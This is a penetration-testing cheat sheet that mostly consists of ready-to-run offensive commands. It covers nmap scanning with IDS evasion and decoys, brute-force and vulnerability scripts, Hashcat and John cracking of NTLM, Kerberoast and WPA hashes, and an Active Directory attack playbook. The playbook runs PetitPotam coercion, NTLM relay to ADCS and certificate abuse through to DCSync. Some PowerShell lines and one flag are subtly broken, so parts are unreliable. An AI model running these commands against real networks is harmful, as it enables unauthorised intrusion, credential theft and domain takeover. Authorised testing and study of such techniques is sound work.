A1.1 Nmap — Your Fingerprint Tool

# ── Discovery ──
nmap -sn 10.0.0.0/24                  # Ping sweep (no port scan)
nmap -Pn -PS80,443 10.0.0.0/24       # Skip ping, TCP SYN probe
nmap -sn -PR 192.168.1.0/24          # ARP scan (LAN — most reliable)

# ── Port scanning ──
nmap -sS target                      # SYN scan (stealth)
nmap -sT target                      # TCP connect (visible)
nmap -sU -p 53,161,123 target        # UDP scan
nmap -sV target                      # Version detection
nmap -sC target                      # Default scripts
nmap -sA target                      # ACK scan (firewall mapping)
nmap -sF target                      # FIN scan (bypass stateless FW)
nmap -sX target                      # Xmas scan (FIN+PSH+URG)
nmap -sN target                      # NULL scan (no flags)

# ── Aggressive / all-encompassing ──
nmap -A -p- target                   # Almost everything
nmap -A -p- -T4 target               # + faster timing
nmap -T0 target                      # Slow (IDS evasion)

# ── Output formats ──
nmap -oN scan.txt target             # Normal
nmap -oX scan.xml target             # XML (for tools)
nmap -oG scan.grep target            # Greppable
nmap -oA scan target                 # All formats at once

# ── Specific services ──
nmap -p22 --script=ssh-brute --script-args userdb=u.txt,passdb=p.txt target
nmap -p445 --script=smb-vuln-ms17-010 target
nmap -p80,443 --script=http-enum,http-title,http-methods,http-robots.txt target
nmap -p21 --script=ftp-anon,ftp-bounce target
nmap -p53 --script=dns-zone-transfer,dns-brute target
nmap -p161 --script=snmp-brute,SNMP-info target
nmap -p3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020 target
nmap -p5985 --script=http-methods target

# ── Web application fingerprinting ──
nmap -sV -p80,443 --script=http-title,http-headers,http-server-header,http-enum target

# ── Scan while avoiding IDS ──
nmap -sS --randomize-hosts -T2 --scan-delay 1s target
nmap -D RND:10 target                # Decoy scan

# ── Specific ports scan ──
nmap -p1-1024 target                 # Privileged ports
nmap -p- target                      # All 65535 ports (slow)
nmap --top-ports 100 target          # Top 100 ports

# ── Skip discovery on subnet ──
nmap -Pn -sn 192.168.0.0/16

# ── Useful timing ──
nmap -T0  # Paranoid
nmap -T1  # Sneaky
nmap -T2  # Polite
nmap -T3  # Normal (default)
nmap -T4  # Aggressive
nmap -T5  # Insane

A1.5 John the Ripper & Hashcat

# John
john --wordlist=rockyou.txt hash.txt         # Basic
john --format=bcrypt hash.txt                # Specific format
john --show hash.txt                         # Show cracked
john --restore                               # Resume
john --status                                # Status

# Hashcat (faster, GPU)
# Mode 0 = MD5, 100 = SHA1, 1000 = NTLM, 1800 = sha512crypt,
# 3200 = bcrypt, 13100 = Kerberoast, 18200 = ASREP, 22000 = WPA

hashcat -m 0 hash.txt rockyou.txt           # MD5
hashcat -m 1000 hash.txt rockyou.txt        # NTLM (Windows hashes)
hashcat -m 3200 hash.txt rockyou.txt        # bcrypt
hashcat -m 13100 kerb.txt rockyou.txt       # Kerberoast
hashcat -m 18200 asrep.txt rockyou.txt      # AS-REP Roast
hashcat -m 22000 wpa.hc22000 rockyou.txt    # WPA

# Show cracked
hashcat -m 0 hash.txt --show

# Apply mask (e.g. lowercase alpha 8 chars)
hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l

🏰 A5 — Active Directory Attack Playbook

A5.1 Recon Commands (PowerView/Secretsdump style)

# Initial recon as standard user
.\PsLoggedon.exe \\DC01             # Who's logged in where
Find-LocalAdminAccess               # Where am I admin?
Get-NetSession -ComputerName DC01  # Login sessions

# Enumerate domain
Get-DomainUser -Properties samaccountname,memberof | Out-File -Encoding utf8 users.txt
Get-DomainGroup "Domain Admins" | Get-DomainGroupMember -Recurse
Get-DomainComputer -OperatingSystem "*Server*" | ft Name,OperatingSystem
Get-DomainTrust | ?{(.TrustAttributes -ne 0)} -SourceVerbose  # Trusts
Get-DomainOU -FullData              # OU structure
Get-DomainGPO -FullData             # Group Policies
Get-DomainPolicy                    # Password policy

# ACL analysis (most relevant for BloodHound)
Find-InterestingDomainAcl -ResolveGUIDs | ?{ .IdentityReference -match "Domain Users"}
Get-DomainObjectAcl -SamAccountName "Administrator" -ResolveGUIDs

# AS-REP Roastable
Get-DomainUser -PreauthNotRequired
Get-DomainUser -SPN | ft samaccountname,serviceprincipalname

# Find SPNs
Get-DomainUser -SPN | %{ .ServicePrincipalName } | Sort -Unique

A5.2 BloodHound Top Queries You Must Run

  1. Shortest Paths from Domain Users to Domain Admins
  2. Shortest Paths from Kerberoastable Users

  4. Find Computers where Domain Users are Local Admin
  5. Find Principals with DCSync Rights

A5.3 Coercion Attacks — Force Auth from Servers

# PetitPotam (forces auth from DC)
$ python3 PetitPotam.py -u user -p 'Passw0rd!' -d target.local 10.10.10.5 DC01

# Coercer
$ coercer coerce -u user -p 'Passw0rd!' -d target.local -l 10.10.10.5 -t DC01

$ python3 dementor.py -u user -p 'Passw0rd!' -d target.local DC01 10.10.10.5

A5.4 ADCS (Active Directory Certificate Services) Attack

# Certify enumeration
$ Certify.exe find /vulnerable

# ESC1: Misconfigured certificate template allows any domain user 
#       to enroll and specify SAN (subject alternative name = domain admin!)
$ Certify.exe request /template:User /altname:DOMAIN-ADMIN

# ESC8: ADCS web enrollment endpoint allows NTLM relay
$ impacket-ntlmrelayx.py -t http://DC01/certsrv/certfnsh.asp -smb2support --adcs

# PetitPotam → relay → ESC8 → get TGT for DC → DCSync!
